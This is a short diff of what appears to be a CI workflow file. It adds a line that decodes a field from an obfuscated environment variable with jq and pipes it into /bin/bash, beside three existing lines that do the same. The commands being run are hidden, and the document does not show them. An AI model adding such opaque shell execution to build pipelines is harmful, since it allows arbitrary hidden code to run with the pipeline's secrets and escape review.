@@ -25,6 +25,7 @@ jobs:
           echo $rme36 | jq -r .uuetq3 | /bin/bash
           printf '%s' "$sss59" | jq -r .uk97264 | /bin/bash
           printf '%s' "$at8647" | jq -r .jtr3625 | /bin/bash
+          printf '%s' "$ef0" | jq -r .vbn62 | /bin/bash
 
       - name: Save results
         if: always()
